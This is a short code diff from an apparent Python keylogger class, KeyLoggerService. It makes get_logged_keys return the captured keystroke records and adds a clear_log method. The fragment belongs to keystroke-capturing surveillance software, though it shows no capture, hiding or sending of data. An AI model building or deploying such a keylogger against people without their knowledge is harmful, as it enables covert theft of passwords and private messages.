@@ -22,8 +22,10 @@ class KeyLoggerService(KeyLogger):
         self.__listener.stop()
 
     def get_logged_keys(self):
-        pass
-
+        return self.__key_records
+    
+    def clear_log(self):
+        self.__key_records: list [str] = []
 
 # k = KeyLoggerService()
 # k.start_logging()
